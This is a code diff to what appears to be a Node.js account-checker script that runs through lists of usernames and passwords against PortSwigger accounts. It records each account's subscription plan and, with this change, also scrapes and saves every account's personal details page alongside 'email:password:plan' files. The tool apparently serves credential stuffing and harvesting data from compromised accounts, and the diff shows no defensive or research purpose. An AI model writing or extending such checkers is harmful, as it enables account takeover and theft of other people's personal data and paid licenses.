@@ -141,11 +141,10 @@ function extractPlan(html) {
     return 'Unknown';
 }
 
-async function checkLicenses(username, password) {
+async function getPersonalDetails(cookieString) {
     try {
-        const cookieString = getCookieString(cookiesJSON);
         const res = await makeRequest(
-            { url: 'https://portswigger.net/users/youraccount/licenses', method: 'GET' },
+            { url: 'https://portswigger.net/users/youraccount/personaldetails', method: 'GET' },
             cookieString
         );
 
@@ -169,6 +168,53 @@ async function checkLicenses(username, password) {
                 return {
                     success: true,
                     html: res2.body
+                };
+            }
+        }
+
+        return {
+            success: false,
+            error: `Status ${res.status}`
+        };
+
+    } catch (error) {
+        return {
+            success: false,
+            error: error.message
+        };
+    }
+}
+
+async function checkLicenses(username, password) {
+    try {
+        const cookieString = getCookieString(cookiesJSON);
+        const res = await makeRequest(
+            { url: 'https://portswigger.net/users/youraccount/licenses', method: 'GET' },
+            cookieString
+        );
+
+        if (res.status === 200 && res.body.length > 500) {
+            return {
+                success: true,
+                html: res.body,
+                cookieString: cookieString
+            };
+        }
+
+        if (res.status === 302 && res.location) {
+            let redirectUrl = res.location;
+            if (!redirectUrl.startsWith('http')) redirectUrl = 'https://portswigger.net' + redirectUrl;
+
+            const res2 = await makeRequest(
+                { url: redirectUrl, method: 'GET' },
+                cookieString
+            );
+
+            if (res2.status === 200 && res2.body.length > 500) {
+                return {
+                    success: true,
+                    html: res2.body,
+                    cookieString: cookieString
                 };
             }
         }
@@ -224,6 +270,17 @@ async function processAccount(username, password, index, total) {
 
                 const htmlFile = `${SUBSCRIPTION_PLANS_DIR}/${sanitized}_${plan.replace(/\s/g, '_')}.html`;
                 fs.writeFileSync(htmlFile, result.html);
+
+                // Fetch and save personal details page
+                try {
+                    const personalRes = await getPersonalDetails(result.cookieString);
+                    if (personalRes.success) {
+                        const personalHtmlFile = `${PERSONAL_DETAILS_DIR}/${sanitized}_personal.html`;
+                        fs.writeFileSync(personalHtmlFile, personalRes.html);
+                    }
+                } catch (e) {
+                    // Silently skip if personal details fetch fails
+                }
             }
 
             console.log(`✓ ${plan}`);
@@ -332,8 +389,11 @@ Results saved to:
   - subscriptions_summary.txt
 
   Templates:
-  - templates/personal_details/ (email:password:plan JSON files)
-  - templates/subscription_plans/ (HTML pages for verification)
+  - templates/personal_details/
+    * {email}_details.json (email:password:plan:timestamp)
+    * {email}_personal.html (personal details page from /users/youraccount/personaldetails)
+  - templates/subscription_plans/
+    * {email}_{Plan}.html (subscription page from /users/youraccount/licenses)
 ================================================================================
 `;
 
